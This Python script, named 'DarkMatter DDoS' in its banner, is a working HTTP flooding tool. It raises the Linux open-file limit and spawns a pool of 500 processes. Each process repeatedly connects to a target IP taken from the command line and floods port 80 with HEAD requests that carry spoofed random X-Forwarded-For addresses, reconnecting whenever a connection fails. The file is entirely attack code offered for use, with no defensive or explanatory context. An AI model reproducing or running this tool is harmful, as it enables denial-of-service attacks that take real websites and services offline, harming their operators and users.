import socket
import os
from time import sleep
import multiprocessing
import random
import sys
import platform

print("Detecting System...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
    try:
        os.system("ulimit -n 1030000")
    except Exception as e:
        print(e)
        print("Could not start the script")
else:
    print("Your system is not Linux, You may not be able to run this script in some systems")

def randomip():
    randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return randip

def attack():
    connection = "Connection: null\r\n"
    referer = "Referer: null\r\n"
    get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"

    # Pre-build static parts of the request
    base_request = get_host + referer + connection
    request_end = "\r\n\r\n"

    while True:
        try:
            # Reuse socket when possible
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as atk:
                atk.settimeout(4)  # Prevent hanging
                atk.connect((ip, port))
                # Keep connection alive for multiple requests
                while True:
                    try:
                        forward = "X-Forwarded-For: " + randomip() + "\r\n"
                        full_request = base_request + forward + request_end
                        atk.sendall(full_request.encode())
                        # Reduce CPU usage
                        sleep(0.01)
                    except (socket.error, BrokenPipeError):
                        break  # Reconnect on failure
        except Exception as e:
            sleep(0.1)  # Wait before retrying

print("Welcome To DarkMatter DDoS\n")
ip = sys.argv[1]
port = int(80)
url = f"http://{str(ip)}"
print("[>>>] Starting the attack [<<<]")
sleep(1)

def send2attack():
    # Limit number of parallel processes
    pool = multiprocessing.Pool(processes=500)
    try:
        # Maintain stable number of workers
        while True:
            pool.apply_async(attack)
            sleep(0.001)  # Control process creation rate
    except KeyboardInterrupt:
        pool.terminate()
        pool.join()

try:
    send2attack()
except KeyboardInterrupt:
    print("\nAttack stopped by user")